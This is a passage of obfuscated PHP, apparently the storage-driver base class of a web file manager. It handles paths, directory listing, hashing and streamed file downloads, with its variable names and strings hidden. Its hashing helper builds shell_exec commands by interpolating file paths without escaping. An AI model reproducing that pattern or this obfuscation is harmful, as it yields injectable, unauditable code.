$ıÃº«”¸ = str_replace($â¤™Äà¼[76], $â¤™Äà¼[11], $ıÃº«”¸); } $îñŒ¬Ñ¤[$è¶‚†áÁ . $â¤™Äà¼[73] . $¦¹òûÂí . $â¤™Äà¼[74] . $É—£¬…€] = $ıÃº«”¸; $îñŒ¬Ñ¤[$¦¹òûÂí . $â¤™Äà¼[73] . $è¶‚†áÁ . $â¤™Äà¼[74] . $É—£¬…€] = $É—£¬…€; $îñŒ¬Ñ¤[$¦¹òûÂí . $â¤™Äà¼[73] . $è¶‚†áÁ . $â¤™Äà¼[74] . $ıÃº«”¸] = $É—£¬…€; $îñŒ¬Ñ¤[$è¶‚†áÁ . $â¤™Äà¼[73] . $¦¹òûÂí . $â¤™Äà¼[74] . $ıÃº«”¸] = $ıÃº«”¸; return $ıÃº«”¸; } public function getPathInner($Š‚›÷ãÚ) { $Çô¾†É‰ = IO::init($Š‚›÷ãÚ); return $Çô¾†É‰->path; } public function getPathOuter($âô†Æ ) { $³Œı‚€ =& $_SERVER[§Êá¸İ]; $–”¨£ßĞ = strlen(trim($this->pathBase, $³Œı‚€[8])); $âô†Æ  = substr(trim($âô†Æ , $³Œı‚€[8]), $–”¨£ßĞ); return $this->pathDriver . $³Œı‚€[8] . ltrim($âô†Æ , $³Œı‚€[8]); } public function isParentOf($•’Ü×ÜŸ, $™Š˜ªá—) { $İĞ°ò“¡ =& $_SERVER[§Êá¸İ]; $•’Ü×ÜŸ = rtrim(strtolower($•’Ü×ÜŸ), $İĞ°ò“¡[8]) . $İĞ°ò“¡[8]; $™Š˜ªá— = rtrim(strtolower($™Š˜ªá—), $İĞ°ò“¡[8]) . $İĞ°ò“¡[8]; $Û„â±àÒ = strpos($™Š˜ªá—, $•’Ü×ÜŸ) === 0; return $Û„â±àÒ; } public function getType() { $–ÓıŞ =& $_SERVER[§Êá¸İ]; $ÚÔ¸¶Ğ† = str_replace($–ÓıŞ[77], $–ÓıŞ[12], get_class($this)); return strtolower($ÚÔ¸¶Ğ†); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ª¶²îë÷, $®Ø¥ëŒì) { $ŒŒµêŞ =& $_SERVER[§Êá¸İ]; $‹¥œ•Š¯ = rtrim($ª¶²îë÷, $ŒŒµêŞ[8]) . $ŒŒµêŞ[8] . $®Ø¥ëŒì; $¨º˜ıÔ‰ = $this->exist($‹¥œ•Š¯); return $¨º˜ıÔ‰ ? $‹¥œ•Š¯ : !1; } public function setModifyTime($ÀÉìë•«, $ª›õ×ùó = '') { } public function renameObject($üÚÎ»ŠŸ, $¨ÈåÓïÑ) { $©ëé‘¾Ë = $¨ÈåÓïÑ; $üÚÎ»ŠŸ = $this->getPathOuter($üÚÎ»ŠŸ); $¨ÈåÓïÑ = $this->pathFather($üÚÎ»ŠŸ) . $¨ÈåÓïÑ; $Šş¦éÆ‰ = IO::copy($üÚÎ»ŠŸ, $this->pathFather($üÚÎ»ŠŸ), REPEAT_RENAME_FOLDER, $©ëé‘¾Ë); if ($Šş¦éÆ‰) { IO::remove($üÚÎ»ŠŸ); } return $Šş¦éÆ‰ ? $¨ÈåÓïÑ : !1; } public function tempFile($ŠÛ•œ‚ = '', $Éäçó×ô = '') { if (!$ŠÛ•œ‚) { $ŠÛ•œ‚ = rand_string(15); } $Ç÷‹éßÒ = TEMP_FILES . rand_string(15) . $_SERVER[§Êá¸İ][8]; @mkdir($Ç÷‹éßÒ, DEFAULT_PERRMISSIONS, !0); $§î€÷â = $Ç÷‹éßÒ . $ŠÛ•œ‚; @touch($§î€÷â); if ($Éäçó×ô) { file_put_contents($§î€÷â, $Éäçó×ô); } return $§î€÷â; } public function tempFileRemve($ıŒ½ÎÈú) { @unlink($ıŒ½ÎÈú); @rmdir($this->pathFather($ıŒ½ÎÈú)); } public function mkfile($’€úÂÎí, $Š§‚ƒ„— = '', $öæüÔ÷Ï = REPEAT_RENAME) { } public function mkdir($µõ·„ãİ, $”ø¨‡° = REPEAT_SKIP) { } public function delFile($£¯«‰ò’) { } public function delFolder($ôØÖ„€³) { } public function copyFile($ï£”¬öˆ, $˜¿¾Òâ) { } public function moveFile($ïÁÀüå¤, $É¦†ô) { } public function remove($İ™À‡Éà) { if ($this->isFile($İ™À‡Éà)) { return $this->delFile($İ™À‡Éà); } return $this->delFolder($İ™À‡Éà); } public function rename($Á¨¦•¤­, $åËùĞÍÂ) { } public function exist($éì˜×´) { } public function findByHash($Á¸ûú§× = '', $ü×‚›˜è = '') { return !1; } public function isFile($Îè¿‡ï) { } public function isFolder($©£Æ¸½·) { } public function size($®œÔ‚Åâ) { } public function info($–¾úš) { } public function infoSimple($á›¼ß) { return $this->info($á›¼ß); } public function infoAuth($¢œò‰­ø) { return $this->info($¢œò‰­ø); } public function infoFull($±È„÷Ää) { return $this->info($±È„÷Ää); } public function infoFullSimple($ó¡š¢Â) { return $this->info($ó¡š¢Â); } public function infoWithChildren($×ÙÄéç¼) { $—¾¹Ş¹¢ =& $_SERVER[§Êá¸İ]; static $êĞÃŞÃ = array(); if (isset($êĞÃŞÃ[$×ÙÄéç¼])) { return $êĞÃŞÃ[$×ÙÄéç¼]; } $ÑÕä®¯Á = $this->info($×ÙÄéç¼); if ($ÑÕä®¯Á && $ÑÕä®¯Á[$—¾¹Ş¹¢[33]] == $—¾¹Ş¹¢[78]) { $øš¢ÄÊø = array($—¾¹Ş¹¢[79] => 0, $—¾¹Ş¹¢[80] => 0, $—¾¹Ş¹¢[81] => 0); $this->infoChildren($×ÙÄéç¼, $øš¢ÄÊø); $ÑÕä®¯Á[$—¾¹Ş¹¢[79]] = $øš¢ÄÊø[$—¾¹Ş¹¢[79]]; $ÑÕä®¯Á[$—¾¹Ş¹¢[82]] = array($—¾¹Ş¹¢[83] => $øš¢ÄÊø[$—¾¹Ş¹¢[80]], $—¾¹Ş¹¢[84] => $øš¢ÄÊø[$—¾¹Ş¹¢[81]]); $êĞÃŞÃ[$×ÙÄéç¼] = $ÑÕä®¯Á; } return $ÑÕä®¯Á; } public function listPath($’±ô²â, $Ÿ„€ÍıË = false) { } public function has($äÃášØŸ, $Î¿Ì©Ø± = false, $¯ô”Ì¾„ = false) { } public function canRead($×Õ€¨çç) { } public function canWrite($¯ñà„µ) { } public function getContent($¤ÛŞªşô) { } public function setContent($İ¤ì„Ó›, $ˆ”à›Ì = '') { } protected function infoChildren($šƒ·üıÃ, &$ä‡úÉì) { $ô¬ø–‹Ù =& $_SERVER[§Êá¸İ]; check_abort_echo(); $½ç¯ÜÄÜ = $this->listPath($šƒ·üıÃ, !0); $½ç¯ÜÄÜ = array_merge($½ç¯ÜÄÜ[$ô¬ø–‹Ù[85]], $½ç¯ÜÄÜ[$ô¬ø–‹Ù[86]]); foreach ($½ç¯ÜÄÜ as $®Ø¦Ÿ‰¬) { if ($®Ø¦Ÿ‰¬[$ô¬ø–‹Ù[33]] == $ô¬ø–‹Ù[78]) { $ä‡úÉì[$ô¬ø–‹Ù[81]]++; $‹×æ¹úÚ = $this->getPathInner($®Ø¦Ÿ‰¬[$ô¬ø–‹Ù[87]]); $this->infoChildren($‹×æ¹úÚ, $ä‡úÉì); } else { $ä‡úÉì[$ô¬ø–‹Ù[80]]++; $ä‡úÉì[$ô¬ø–‹Ù[79]] += $®Ø¦Ÿ‰¬[$ô¬ø–‹Ù[79]]; } } } public function fileSubstr($¶²ù °›, $†Ëû „Œ, $¤Ò‰êó) { } public function listAll($´¨õß¨‘) { } public function listAllMake($Ãõºá›é, &$À‘¨ï‚Ï) { $ßÍØ’‡² =& $_SERVER[§Êá¸İ]; check_abort_echo(); $Ñ×ÉõÎø = $this->listPath($Ãõºá›é, !0); if (!$Ñ×ÉõÎø) { return; } $‘èÃÌáÕ = array_merge($Ñ×ÉõÎø[$ßÍØ’‡²[85]], $Ñ×ÉõÎø[$ßÍØ’‡²[86]]); foreach ($‘èÃÌáÕ as $Ë÷İßºÉ) { $êÇ°İ²ò = $Ë÷İßºÉ[$ßÍØ’‡²[33]] == $ßÍØ’‡²[78]; $îÙá»¹¤ = array($ßÍØ’‡²[87] => $Ë÷İßºÉ[$ßÍØ’‡²[87]], $ßÍØ’‡²[78] => $êÇ°İ²ò); if (isset($Ë÷İßºÉ[$ßÍØ’‡²[79]])) { $îÙá»¹¤[$ßÍØ’‡²[79]] = $Ë÷İßºÉ[$ßÍØ’‡²[79]]; } if (isset($Ë÷İßºÉ[$ßÍØ’‡²[88]])) { $îÙá»¹¤[$ßÍØ’‡²[88]] = $Ë÷İßºÉ[$ßÍØ’‡²[88]]; } if (!$êÇ°İ²ò) { $À‘¨ï‚Ï[] = $îÙá»¹¤; continue; } $À‘¨ï‚Ï[] = $îÙá»¹¤; $Çº¤¬ = $Ë÷İßºÉ[$ßÍØ’‡²[87]]; $üˆÙ´Ü‰ = $this->pathDriver; if (substr($Ë÷İßºÉ[$ßÍØ’‡²[87]], 0, strlen($üˆÙ´Ü‰)) == $üˆÙ´Ü‰) { $Çº¤¬ = substr($Çº¤¬, strlen($üˆÙ´Ü‰)); } $this->listAllMake($Çº¤¬, $À‘¨ï‚Ï); } } public function listAllSimple($ø«Í‡, $«û¡öı¨ = false) { $œšøÃ›Œ = $this->listAll($ø«Í‡); return $this->listAllSimpleMake($œšøÃ›Œ, $this->getPathOuter($ø«Í‡), $«û¡öı¨); } public function listAllSimpleMake($íª’Æ€†, $×¨”‰Ïï, $÷•ÏÒ½ï) { $Ñî÷ëÂĞ =& $_SERVER[§Êá¸İ]; $öø˜ªëå = array(); $×¨”‰Ïï = rtrim(get_path_father($×¨”‰Ïï), $Ñî÷ëÂĞ[8]) . $Ñî÷ëÂĞ[8]; foreach ($íª’Æ€† as $´ÜÛ€Íµ) { $é—Ÿ®Âî = array($Ñî÷ëÂĞ[87] => $´ÜÛ€Íµ[$Ñî÷ëÂĞ[87]], $Ñî÷ëÂĞ[89] => $´ÜÛ€Íµ[$Ñî÷ëÂĞ[87]], $Ñî÷ëÂĞ[78] => $´ÜÛ€Íµ[$Ñî÷ëÂĞ[78]]); if (isset($´ÜÛ€Íµ[$Ñî÷ëÂĞ[79]]) && !$´ÜÛ€Íµ[$Ñî÷ëÂĞ[78]]) { $é—Ÿ®Âî[$Ñî÷ëÂĞ[79]] = $´ÜÛ€Íµ[$Ñî÷ëÂĞ[79]]; } if (isset($´ÜÛ€Íµ[$Ñî÷ëÂĞ[88]])) { $é—Ÿ®Âî[$Ñî÷ëÂĞ[88]] = $´ÜÛ€Íµ[$Ñî÷ëÂĞ[88]]; } if (is_array($´ÜÛ€Íµ[$Ñî÷ëÂĞ[90]])) { $é—Ÿ®Âî[$Ñî÷ëÂĞ[89]] = $´ÜÛ€Íµ[$Ñî÷ëÂĞ[90]][$Ñî÷ëÂĞ[87]]; $é—Ÿ®Âî[$Ñî÷ëÂĞ[79]] = $´ÜÛ€Íµ[$Ñî÷ëÂĞ[90]][$Ñî÷ëÂĞ[79]]; $é—Ÿ®Âî[$Ñî÷ëÂĞ[88]] = $´ÜÛ€Íµ[$Ñî÷ëÂĞ[90]][$Ñî÷ëÂĞ[88]]; } else { if (substr($´ÜÛ€Íµ[$Ñî÷ëÂĞ[87]], 0, strlen($×¨”‰Ïï)) == $×¨”‰Ïï) { $é—Ÿ®Âî[$Ñî÷ëÂĞ[87]] = substr($´ÜÛ€Íµ[$Ñî÷ëÂĞ[87]], strlen($×¨”‰Ïï)); } } $Éé‚ç˜æ = $´ÜÛ€Íµ[$Ñî÷ëÂĞ[78]] ? $Ñî÷ëÂĞ[8] : $Ñî÷ëÂĞ[12]; $é—Ÿ®Âî[$Ñî÷ëÂĞ[89]] = rtrim($é—Ÿ®Âî[$Ñî÷ëÂĞ[89]], $Ñî÷ëÂĞ[8]) . $Éé‚ç˜æ; $é—Ÿ®Âî[$Ñî÷ëÂĞ[87]] = $Ñî÷ëÂĞ[8] . trim($é—Ÿ®Âî[$Ñî÷ëÂĞ[87]], $Ñî÷ëÂĞ[8]) . $Éé‚ç˜æ; if (!$÷•ÏÒ½ï) { $­†è½Ş  = explode($Ñî÷ëÂĞ[8], trim($é—Ÿ®Âî[$Ñî÷ëÂĞ[87]], $Ñî÷ëÂĞ[8])); $é—Ÿ®Âî[$Ñî÷ëÂĞ[87]] = $Ñî÷ëÂĞ[8] . implode($Ñî÷ëÂĞ[8], array_slice($­†è½Ş , 1)) . $Éé‚ç˜æ; } $öø˜ªëå[] = $é—Ÿ®Âî; } return array_sort_by($öø˜ªëå, $Ñî÷ëÂĞ[87]); } public function upload($û¨Æ¾ø­, $öÅ‹îÈĞ, $¢Êä§ûû = false, $º¸®ñŠ· = REPEAT_REPLACE) { } public function uploadFileByID($á˜ó¼ŠÃ, $‘şí®Ÿ, $óÑã«œ) { } public function uploadFileByPath($Ë—Äæıñ, $Î¨„™‘, $ú™ŞËÅ = array()) { } public function isUploadServer() { $Ú¥Ñ“‚ =& $_SERVER[§Êá¸İ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ú¥Ñ“‚[91]) { return !0; } return $GLOBALS[$Ú¥Ñ“‚[6]][$Ú¥Ñ“‚[92]][$Ú¥Ñ“‚[93]]; } public function isFileOutServer() { $»øÇèĞñ =& $_SERVER[§Êá¸İ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $»øÇèĞñ[91]) { return !0; } return $GLOBALS[$»øÇèĞñ[6]][$»øÇèĞñ[92]][$»øÇèĞñ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ŸƒØ„°) { $¾×¾…“  =& $_SERVER[§Êá¸İ]; if (!$this->isCdnHost()) { return $ŸƒØ„°; } return str_replace(trim(get_url_root($ŸƒØ„°), $¾×¾…“ [8]), trim($this->cdnHost, $¾×¾…“ [8]), $ŸƒØ„°); } public function uploadLink($Ê×ó¶·š, $ï–×è‡É = 0) { $øÈ²¿‡Ú =& $_SERVER[§Êá¸İ]; if ($this->isUploadServer()) { return; } $è˜º§Å = $this->getType(); if (!in_array($è˜º§Å, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ßü¢ñÒö = 1024 * 1024 * 10; $´ŞÓÉ¨– = $ï–×è‡É <= $ßü¢ñÒö ? $øÈ²¿‡Ú[95] : $øÈ²¿‡Ú[96]; $œ¹Ÿ˜† = (!$ï–×è‡É ? 1 : ceil($ï–×è‡É / pow(1024, 3))) * 3600 * 4; $ÔÏã‘Ï¤ = $this->{$´ŞÓÉ¨–}($Ê×ó¶·š, $œ¹Ÿ˜†); if ($ÔÏã‘Ï¤) { $ÔÏã‘Ï¤[$øÈ²¿‡Ú[97]] = $Ê×ó¶·š; $ÔÏã‘Ï¤[$øÈ²¿‡Ú[98]] = $è˜º§Å; } return $ÔÏã‘Ï¤; } public function uploadFormData($ñ°ÈÛë, $¨‚¼ã’ = 3600) { } public function multiUploadFormData($ÀâØ¯îú, $ËÆ™Æ›î = 3600) { } public function download($ã™ÔëÖï, $ƒŞ¢³ õ) { } public function ext($è×ï‚ú) { $ªæ°‰ø½ =& $_SERVER[§Êá¸İ]; if (strpos($è×ï‚ú, $ªæ°‰ø½[8]) === -1) { $áãÏµ¥ = $è×ï‚ú; } else { $áãÏµ¥ = $this->pathThis($è×ï‚ú); } $‹²º™ğ = $ªæ°‰ø½[12]; if (strstr($áãÏµ¥, $ªæ°‰ø½[10])) { $‹²º™ğ = substr($áãÏµ¥, strrpos($áãÏµ¥, $ªæ°‰ø½[10]) + 1); $‹²º™ğ = strtolower($‹²º™ğ); } if (strlen($‹²º™ğ) > 3 && preg_match($ªæ°‰ø½[99], $‹²º™ğ, $òÍû»“Æ)) { $‹²º™ğ = $ªæ°‰ø½[12]; } return $‹²º™ğ; } public function pathThis($·ŒÉ¯ûÅ) { $¾ş€ş¯Š =& $_SERVER[§Êá¸İ]; $·ŒÉ¯ûÅ = str_replace($¾ş€ş¯Š[100], $¾ş€ş¯Š[8], rtrim($·ŒÉ¯ûÅ, $¾ş€ş¯Š[8])); $’´ñü ğ = strrpos($·ŒÉ¯ûÅ, $¾ş€ş¯Š[8]); if ($’´ñü ğ === !1) { return $·ŒÉ¯ûÅ; } return substr($·ŒÉ¯ûÅ, $’´ñü ğ + 1); } public function pathFather($„Ñ‹¶àË) { $äîö—Òß =& $_SERVER[§Êá¸İ]; $„Ñ‹¶àË = str_replace($äîö—Òß[100], $äîö—Òß[8], rtrim($„Ñ‹¶àË, $äîö—Òß[8])); $¦éĞÃü° = strrpos($„Ñ‹¶àË, $äîö—Òß[8]); if ($¦éĞÃü° === !1) { return $äîö—Òß[12]; } return substr($„Ñ‹¶àË, 0, $¦éĞÃü° + 1); } public function hashSimple($áŞó¹é³) { $“¼ü¸š =& $_SERVER[§Êá¸İ]; if (!$áŞó¹é³) { return md5($“¼ü¸š[12]); } $Ôºâšˆ¦ = $this->size($áŞó¹é³); $æµ…«µÖ = 200; $ò¾šèÆÂ = 50; if ($Ôºâšˆ¦ <= $æµ…«µÖ * $ò¾šèÆÂ) { return $this->hashMd5($áŞó¹é³) . $Ôºâšˆ¦; } $ó˜áû— = intval($Ôºâšˆ¦ / $ò¾šèÆÂ); $âÍ½†ˆ‘ = $“¼ü¸š[12]; for ($õ°­îê© = 0; $õ°­îê© < $ò¾šèÆÂ; $õ°­îê©++) { $âÍ½†ˆ‘ .= $this->fileSubstr($áŞó¹é³, $ó˜áû— * $õ°­îê©, $æµ…«µÖ); } $âÍ½†ˆ‘ .= $this->fileSubstr($áŞó¹é³, $Ôºâšˆ¦ - $æµ…«µÖ, $æµ…«µÖ); return md5($âÍ½†ˆ‘) . $Ôºâšˆ¦; } public static $md5Cache = array(); public function hashMd5($…áÛ‹±ğ) { if (!$…áÛ‹±ğ) { return md5($_SERVER[§Êá¸İ][12]); } $…áÛ‹±ğ = $this->iconvSystem($…áÛ‹±ğ); if (isset(self::$md5Cache[$…áÛ‹±ğ])) { return self::$md5Cache[$…áÛ‹±ğ]; } self::$md5Cache[$…áÛ‹±ğ] = $this->hashMd5Shell($…áÛ‹±ğ); if (!self::$md5Cache[$…áÛ‹±ğ]) { self::$md5Cache[$…áÛ‹±ğ] = @md5_file($…áÛ‹±ğ); } return self::$md5Cache[$…áÛ‹±ğ]; } private function hashMd5Shell($‚ƒ¼ıø¦) { $Œ»ùœÖ´ =& $_SERVER[§Êá¸İ]; if (!$‚ƒ¼ıø¦) { return md5($Œ»ùœÖ´[12]); } if (!function_exists($Œ»ùœÖ´[101])) { return !1; } $±šÖšÊú = array($Œ»ùœÖ´[102], $Œ»ùœÖ´[103]); $ç‰¤ßÎÓ = Cache::get($Œ»ùœÖ´[104]); if (!$ç‰¤ßÎÓ) { $ß“Ûüš = BASIC_PATH . $Œ»ùœÖ´[105]; $ÉåÚÏ±È = md5_file($ß“Ûüš); $ç‰¤ßÎÓ = $Œ»ùœÖ´[106]; foreach ($±šÖšÊú as $§ôï¸˜„) { $¤¨õÚ¹ = shell_exec($§ôï¸˜„ . "\x20\42{$ß“Ûüš}\42"); if ($¤¨õÚ¹ && substr(trim($¤¨õÚ¹), 0, 32) == $ÉåÚÏ±È) { $ç‰¤ßÎÓ = $§ôï¸˜„; break; } } Cache::set($Œ»ùœÖ´[104], $ç‰¤ßÎÓ, 3600); } if ($ç‰¤ßÎÓ == $Œ»ùœÖ´[106]) { return !1; } $¤¨õÚ¹ = shell_exec($ç‰¤ßÎÓ . "\x20\42{$‚ƒ¼ıø¦}\42"); $¤¨õÚ¹ = str_replace($Œ»ùœÖ´[107], $Œ»ùœÖ´[12], $¤¨õÚ¹); return substr($¤¨õÚ¹, 0, 32); } public function link($Í†¶¡Øº) { return $Í†¶¡Øº; } public function fileOut($š¥¦¤Ù², $äÂ«Ê÷ä = false, $¤®ƒ—¡ó = false, $›ÏŒ²‚İ = '') { $¡õÍš¡ë =& $_SERVER[§Êá¸İ]; $this->cacheMethod(null, null); if (!$š¥¦¤Ù² || !$this->exist($š¥¦¤Ù²)) { show_json(LNG($¡õÍš¡ë[108]), !1, $¤®ƒ—¡ó); } $€…Óà¡ª = $this->getType() == $¡õÍš¡ë[109]; $şâÑ–Ë¼ = $GLOBALS[$¡õÍš¡ë[6]][$¡õÍš¡ë[92]][$¡õÍš¡ë[110]][$¡õÍš¡ë[111]]; $ÜèÂ®ä = (double) $GLOBALS[$¡õÍš¡ë[6]][$¡õÍš¡ë[92]][$¡õÍš¡ë[110]][$¡õÍš¡ë[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÖÅ×´šÍ = $this->infoFull($š¥¦¤Ù²); $ç†—’Ä“ = $ÖÅ×´šÍ[$¡õÍš¡ë[79]]; $Ãêù¤” = gmdate($¡õÍš¡ë[113], $ÖÅ×´šÍ[$¡õÍš¡ë[88]]); $­ùš–œ = $¤®ƒ—¡ó ? $¤®ƒ—¡ó : $this->iconvApp($ÖÅ×´šÍ[$¡õÍš¡ë[32]]); $‹–åóš = 0; $õÎŒŸ¾÷ = $ç†—’Ä“ - 1; $˜ÔºÚ‰ú = $this->ext($­ùš–œ); if (in_array($˜ÔºÚ‰ú, array($¡õÍš¡ë[114], $¡õÍš¡ë[115], $¡õÍš¡ë[116], $¡õÍš¡ë[117]))) { $˜ÔºÚ‰ú = $¡õÍš¡ë[118]; } if (in_array($˜ÔºÚ‰ú, array($¡õÍš¡ë[119]))) { $˜ÔºÚ‰ú = $¡õÍš¡ë[120]; } if (!$›ÏŒ²‚İ) { $›ÏŒ²‚İ = md5($Ãêù¤” . $ç†—’Ä“); } $›ÏŒ²‚İ = $¡õÍš¡ë[121] . $›ÏŒ²‚İ . $¡õÍš¡ë[121]; $—ŞóØ®ï = get_file_mime($˜ÔºÚ‰ú); $ìÎĞ´‚Í = !0; $ìÎĞ´‚Í = isset($_GET[$¡õÍš¡ë[122]]) ? !1 : !0; if ($äÂ«Ê÷ä === !1 && !mime_support($—ŞóØ®ï)) { $—ŞóØ®ï = $¡õÍš¡ë[123]; } header($¡õÍš¡ë[124]); header($¡õÍš¡ë[125] . $—ŞóØ®ï); $²Úò«€… = rawurlencode($­ùš–œ); $²Úò«€… = $¡õÍš¡ë[121] . $²Úò«€… . $¡õÍš¡ë[126] . $²Úò«€…; if ($äÂ«Ê÷ä) { header($¡õÍš¡ë[127]); header($¡õÍš¡ë[128] . $²Úò«€…); } else { if ($ìÎĞ´‚Í) { header($¡õÍš¡ë[129] . $²Úò«€…); } } $ÏÑ‘‡ = 3600 * 24 * 30; header($¡õÍš¡ë[130]); header($¡õÍš¡ë[131]); header($¡õÍš¡ë[132] . $ÏÑ‘‡); header($¡õÍš¡ë[133] . gmdate($¡õÍš¡ë[113], time() + $ÏÑ‘‡) . $¡õÍš¡ë[134]); if (isset($_SERVER[$¡õÍš¡ë[135]]) && strtotime($_SERVER[$¡õÍš¡ë[135]]) == $ÖÅ×´šÍ[$¡õÍš¡ë[88]]) { header($¡õÍš¡ë[136], !0, 304); die; } if (isset($_SERVER[$¡õÍš¡ë[137]]) && $_SERVER[$¡õÍš¡ë[137]] == $›ÏŒ²‚İ) { header($¡õÍš¡ë[138] . $›ÏŒ²‚İ, !0, 304); die; } header($¡õÍš¡ë[138] . $›ÏŒ²‚İ); header($¡õÍš¡ë[139] . $Ãêù¤” . $¡õÍš¡ë[134]); header($¡õÍš¡ë[140] . $­ùš–œ); header($¡õÍš¡ë[141]); header($¡õÍš¡ë[142] . $ç†—’Ä“); header($¡õÍš¡ë[143]); Hook::trigger($¡õÍš¡ë[144], $š¥¦¤Ù², $ç†—’Ä“, $­ùš–œ, $˜ÔºÚ‰ú); if (!$äÂ«Ê÷ä && $˜ÔºÚ‰ú == $¡õÍš¡ë[145]) { if ($ç†—’Ä“ > 1024 * 1024 * 5) { die; } $ß‡Ó„¦· = $this->getContent($š¥¦¤Ù²); $ß‡Ó„¦· = Html::clearSVG($ß‡Ó„¦·); header($¡õÍš¡ë[146] . strlen($ß‡Ó„¦·)); echo $ß‡Ó„¦·; die; } $ë±×è¥ = strtolower($_SERVER[$¡õÍš¡ë[147]]); if ($€…Óà¡ª && $ë±×è¥ && $şâÑ–Ë¼) { if (strstr($ë±×è¥, $¡õÍš¡ë[148])) { header($¡õÍš¡ë[149] . $š¥¦¤Ù²); } else { if (strstr($ë±×è¥, $¡õÍš¡ë[150])) { header($¡õÍš¡ë[151] . $š¥¦¤Ù²); } else { if (strstr($ë±×è¥, $¡õÍš¡ë[152])) { header($¡õÍš¡ë[153] . $š¥¦¤Ù²); } } } if ($ÜèÂ®ä) { header($¡õÍš¡ë[154] . $ÜèÂ®ä); } return; } if (isset($_SERVER[$¡õÍš¡ë[155]])) { if (preg_match($¡õÍš¡ë[156], $_SERVER[$¡õÍš¡ë[155]], $Ì„Ò×Øª)) { $‹–åóš = intval($Ì„Ò×Øª[1]); $‹–åóš = $‹–åóš <= 0 ? 0 : ($‹–åóš >= $õÎŒŸ¾÷ ? $õÎŒŸ¾÷ : $‹–åóš); if (!empty($Ì„Ò×Øª[2])) { $ûÑ™¥òâ = intval($Ì„Ò×Øª[2]); $õÎŒŸ¾÷ = $ûÑ™¥òâ < $‹–åóš ? $‹–åóš : ($ûÑ™¥òâ >= $õÎŒŸ¾÷ ? $õÎŒŸ¾÷ : $ûÑ™¥òâ); } } header($¡õÍš¡ë[157]); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\122\141\x6e\147\145\x3a\x20\x62\171\164\145\163\x20{$‹–åóš}\x2d{$õÎŒŸ¾÷}\x2f" . $ç†—’Ä“); } else { header($¡õÍš¡ë[158]); } header($¡õÍš¡ë[159]); header($¡õÍš¡ë[160]); $Ğê×é›ì = !0; if ($_SERVER[$¡õÍš¡ë[161]] == $¡õÍš¡ë[162] && $ç†—’Ä“ > 1204 * 1024 * 1024 * 2) { $Ğê×é›ì = !1; } if ($Ğê×é›ì) { header($¡õÍš¡ë[163] . ($õÎŒŸ¾÷ - $‹–åóš + 1)); } if ($_SERVER[$¡õÍš¡ë[164]] == $¡õÍš¡ë[165]) { return; } $Òé½Ó›ğ = array($¡õÍš¡ë[166] => !1, $¡õÍš¡ë[167] => $‹–åóš, $¡õÍš¡ë[168] => $õÎŒŸ¾÷, $¡õÍš¡ë[169] => $˜ÔºÚ‰ú, $¡õÍš¡ë[170] => $ÖÅ×´šÍ, $¡õÍš¡ë[171] => $¡õÍš¡ë[12], $¡õÍš¡ë[172] => 0); $Òé½Ó›ğ = Hook::filter($¡õÍš¡ë[173], $Òé½Ó›ğ); $æÕ´Ç€  = 1024 * 300; $Éã’Éí = 0; if ($ÜèÂ®ä) { $Éã’Éí = intval(1000 * 1000 * ($æÕ´Ç€  / $ÜèÂ®ä)); } while ($‹–åóš <= $õÎŒŸ¾÷) { $±§¼¤ğ  = timeFloat(); check_abort(); $‚÷£‹ = $õÎŒŸ¾÷ - $‹–åóš + 1; if ($‚÷£‹ <= $æÕ´Ç€ ) { $æÕ´Ç€  = $‚÷£‹; } $ß‡Ó„¦· = $this->fileSubstr($š¥¦¤Ù², $‹–åóš, $æÕ´Ç€ ); if ($Òé½Ó›ğ[$¡õÍš¡ë[166]]) { $Òé½Ó›ğ[$¡õÍš¡ë[171]] = $ß‡Ó„¦·; $Òé½Ó›ğ[$¡õÍš¡ë[172]] = $‹–åóš; $Òé½Ó›ğ = Hook::filter($¡õÍš¡ë[174], $Òé½Ó›ğ); $ß‡Ó„¦· = $Òé½Ó›ğ[$¡õÍš¡ë[171]]; } echo $ß‡Ó„¦·; $‹–åóš += $æÕ´Ç€ ; if ($æÕ´Ç€  == $‚÷£‹) { $‹–åóš = $õÎŒŸ¾÷ + 1; } if ($Éã’Éí) { $‘âš–¤Ş = intval(1000 * 1000 * (timeFloat() - $±§¼¤ğ )); $úªé´«º = $Éã’Éí - $‘âš–¤Ş; if ($úªé´«º > 5) { usleep($úªé´«º); } } } } public function fileOutServer($àÂ‡Óå, $çâ³‘ç· = false, $òé³¯Û´ = false, $ÜáÏÛ…Ç = '') { $this->fileOut($àÂ‡Óå, $çâ³‘ç·, $òé³¯Û´, $ÜáÏÛ…Ç); } public function fileOutLink($†ÏúØƒÛ) { header($_SERVER[§Êá¸İ][175] . $†ÏúØƒÛ); die; } public function cacheMethod($·ÔÍ€…˜, $Êúåï½, $šº˜û‚‚ = null) { $Á³ùÅ˜ =& $_SERVER[§Êá¸İ]; static $ÏŸòíÃ = array(); $¢ƒ›…Îµ = $Êúåï½ ? ltrim($this->getPathOuter($Êúåï½), $Á³ùÅ˜[8]) : $Á³ùÅ˜[12]; $ÊŒºï„Ù = $Á³ùÅ˜[176] . $·ÔÍ€…˜ . $Á³ùÅ˜[177] . rtrim($¢ƒ›…Îµ, $Á³ùÅ˜[8]); if (is_null($·ÔÍ€…˜)) { $ÏŸòíÃ = array(); return; } if (is_null($Êúåï½)) { foreach ($ÏŸòíÃ as $ÊŒºï„Ù => $şä½Û²Ë) { if (!strstr($ÊŒºï„Ù, $Á³ùÅ˜[176] . $·ÔÍ€…˜ . $Á³ùÅ˜[178])) { continue; } unset($ÏŸòíÃ[$ÊŒºï„Ù]); } return; } if (!is_null($šº˜û‚‚)) { $ÏŸòíÃ[$ÊŒºï„Ù] = $šº˜û‚‚; return; } $¼ØÉÍĞÈ = isset($ÏŸòíÃ[$ÊŒºï„Ù]) ? $ÏŸòíÃ[$ÊŒºï„Ù] : null; if (!is_null($¼ØÉÍĞÈ)) { return $¼ØÉÍĞÈ; } $¼ØÉÍĞÈ = $this->{$·ÔÍ€…˜}($Êúåï½); $ÏŸòíÃ[$ÊŒºï„Ù] = $¼ØÉÍĞÈ; return $¼ØÉÍĞÈ; 